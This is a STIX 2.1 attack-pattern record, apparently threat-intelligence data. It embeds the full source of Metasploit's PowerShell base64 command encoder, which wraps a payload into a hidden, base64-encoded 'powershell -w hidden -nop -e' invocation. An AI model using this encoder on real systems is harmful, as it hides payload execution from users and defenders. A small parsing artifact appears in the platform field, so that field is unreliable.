{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8e469348-0f31-42fa-9cba-959abf6ca85a",
    "created": "2024-08-14T16:33:19.235075Z",
    "modified": "2024-08-14T16:33:19.235082Z",
    "name": "Powershell Base64 Command Encoder",
    "description": " This encodes the command as a base64 encoded command for powershell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/cmd/powershell_base64.rb",
            "external_id": "powershell_base64.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\ninclude Msf::Post::Windows\nclass MetasploitModule < Msf::Encoder\n  Rank = ExcellentRanking\n\n  def initialize\n    super(\n      'Name'             => 'Powershell Base64 Command Encoder',\n      'Description'      => %q{\n        This encodes the command as a base64 encoded command for powershell.\n      },\n      'Author'           => 'Ben Campbell',\n      'Arch'             => ARCH_CMD,\n      'Platform'         => 'win')\n  end\n\n\n  #\n  # Encodes the payload\n  #\n  def encode_block(state, buf)\n\n    # Skip encoding for empty badchars\n    if state.badchars.length == 0\n      return buf\n    end\n\n    if (state.badchars.include? '-') || (state.badchars.include? ' ')\n      return buf\n    end\n\n    cmd = encode_buf(buf)\n\n    if state.badchars.include? '='\n        while cmd.include? '='\n          buf << \" \"\n          cmd = encode_buf(buf)\n        end\n    end\n\n    cmd\n  end\n\n  def encode_buf(buf)\n    # From https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_quoting_rules?view=powershell-7.3\n    # To include a single quotation mark in a single-quoted string, use a second consecutive single quote. For example:\n    # 'don''t' would be the string \"don't\" but using single quotes.\n    #\n    # Note that we can't use double quotes here as double quote strings in PowerShell are classed as expandable strings\n    # and we don't want expansion here, as this might cause any potential elements starting with $ to be interpreted\n    # as a variable within the string to be replaced by that variable's value.\n    #\n    # The use of quotes also ensures that we get around the issue with cmd.exe understanding & as a symbol for\n    # \"also execute this command\", whereas in PowerShell it is a reserved character, so not quoting the string\n    # will result in the & being interpreted by PowerShell and the command failing on an interpretation error in PowerShell itself.\n    base64 = Rex::Text.encode_base64(Rex::Text.to_unicode(\"cmd.exe /c 'start #{Msf::Post::Windows.escape_powershell_literal(buf)} '\"))\n    cmd = \"powershell -w hidden -nop -e #{base64}\"\n  end\nend\n",
    "x_mitre_platforms": [
        "win')"
    ]
}